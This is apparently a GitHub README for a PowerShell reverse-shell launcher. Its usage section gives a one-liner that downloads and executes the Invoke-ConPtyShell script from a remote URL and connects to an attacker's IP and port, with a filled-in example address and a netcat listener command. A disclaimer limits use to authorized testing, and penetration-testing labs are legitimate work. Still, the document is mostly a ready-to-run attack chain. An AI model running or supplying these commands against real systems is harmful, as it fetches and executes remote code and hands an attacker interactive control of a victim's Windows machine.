# Invoke-ConPtyShell Reverse Shell Launcher

A lightweight PowerShell one-liner for downloading and executing **Invoke-ConPtyShell** to establish a fully interactive reverse shell using Windows ConPTY.

> **For authorized security testing and lab environments only.**

---

## Features

* Fully interactive PowerShell reverse shell
* Uses Windows ConPTY for improved terminal support
* Single-line execution
* No local file required
* Useful for penetration testing labs and red team simulations

---

## Usage

Replace the IP address and port with your listener.

```powershell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <ATTACKER_IP> <PORT>
```

### Example

```powershell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.178.118 33413
```

---

## Listener

Start a listener before executing the command.

Example using Stty and Netcat:

```bash
stty raw -echo; (stty size; cat) | nc -lvnp 33413
```

---

## Requirements

* Windows 10 / Windows Server with ConPTY support
* PowerShell
* Network connectivity to the listener
* Appropriate authorization to perform security testing

---

## Credits

* Original **Invoke-ConPtyShell** project by Antonio Coco:
  https://github.com/antonioCoco/ConPtyShell

---

## Disclaimer

This project is intended solely for authorized security assessments, penetration testing, educational use, and laboratory environments. Do not use it against systems or networks without explicit permission. The author assumes no responsibility for misuse or damage resulting from the use of this project.

---

## License

This repository is provided for educational purposes. Please refer to the original project's license and terms of use where applicable.
